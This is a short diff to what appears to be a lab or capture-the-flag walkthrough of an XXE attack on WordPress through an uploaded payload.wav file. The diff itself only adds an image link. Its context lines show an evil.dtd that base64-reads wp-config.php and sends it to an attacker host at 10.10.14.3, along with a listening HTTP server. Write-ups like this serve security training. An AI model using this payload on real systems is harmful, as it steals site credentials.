@@ -767,6 +767,8 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 Upload `payload.wav`
 
+![WP - Media upload](images/wp-admin_manager_success.png)
+
 ```bash
 $ sudo python3 -m http.server 80                                               
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
@@ -812,6 +814,7 @@ $ cat evil.dtd
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php">
 <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.3/?p=%file;'>" >
 ```
+
 Upload `payload.wav` again
 
 ```bash
